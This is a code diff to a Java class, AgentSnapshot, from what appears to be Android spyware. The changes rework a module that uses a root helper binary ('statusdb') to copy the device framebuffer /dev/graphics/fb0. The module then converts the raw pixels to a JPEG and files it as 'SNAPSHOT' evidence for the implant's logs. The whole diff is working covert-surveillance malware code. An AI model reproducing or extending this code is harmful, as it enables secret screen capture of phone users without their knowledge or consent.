@@ -120,26 +120,45 @@ public class AgentSnapshot extends AgentBase {
 			break;
 		}
 
+		try{
+			
+			
+			
 		if (Status.self().haveRoot()) {
 			Display display = ((WindowManager) Status.getAppContext()
 					.getSystemService(Context.WINDOW_SERVICE))
 					.getDefaultDisplay();
+			int width = display.getWidth();
+			int height = display.getHeight();
+			
+			if(Cfg.DEBUG) Log.d("QZ", TAG + " (go): w="+width+" h="+height);
+			
 			byte[] raw = getRawBitmap();
-			if(raw!=null){
-			Bitmap bitmap = Bitmap.createBitmap(display.getWidth(),
-					display.getHeight(), Bitmap.Config.ARGB_8888);
-				
-			ByteBuffer buffer = ByteBuffer.allocate(raw.length);
-			buffer.put(raw);
-			//Bitmap bitmap = BitmapFactory.de
-			bitmap.copyPixelsFromBuffer(buffer);
-			byte[] jpeg = toJpeg(bitmap);
+			if (raw != null) {
+				Bitmap bitmap = Bitmap.createBitmap(width,
+						height, Bitmap.Config.ARGB_8888);
 
-			new LogR(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
+				IntBuffer buffer  = raw2IntBuffer(raw);
+				//bitmap.copyPixelsFromBuffer(buffer);
+				bitmap.setPixels(buffer.array(), 0, width, 0, 0, width, height);
+				byte[] jpeg = toJpeg(bitmap);
+
+				new LogR(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
+			}
+		}
+		}catch(Exception ex){
+			if(Cfg.DEBUG){
+				Log.d("QZ", TAG + " (go) Error: " + ex);
+				ex.printStackTrace();
 			}
 		}
 
 		// log.close();
+	}
+
+	private IntBuffer raw2IntBuffer(byte[] raw) {
+		DataBuffer databuffer= new DataBuffer(raw);
+		return databuffer.asIntBuffer();
 	}
 
 	private byte[] getAdditionalData() {
@@ -180,15 +199,15 @@ public class AgentSnapshot extends AgentBase {
 		String path = filesPath.getAbsolutePath();
 
 		// String
-		// getrawpath=path+"/statuslog -c \"/system/bin/cat /dev/graphics/fb0\"";
-		String getrawpath = path
-				+ "/statusdb -c \"/system/bin/cp /dev/graphics/fb0 "+path+"/frame0\"";
+
+		// String getrawpath = path +
+		// "/statusdb -c \"/system/bin/cp /dev/graphics/fb0 "+path+"/frame0\"";
+		String getrawpath = path + "/statusdb fb";
 		try {
 			Process localProcess = Runtime.getRuntime().exec(getrawpath);
-			
-				localProcess.waitFor();
-			
-			AutoFile file = new AutoFile(path, "frame0");
+			localProcess.waitFor();
+
+			AutoFile file = new AutoFile(path, "frame");
 			if (file.exists()) {
 				return file.read();
 			}
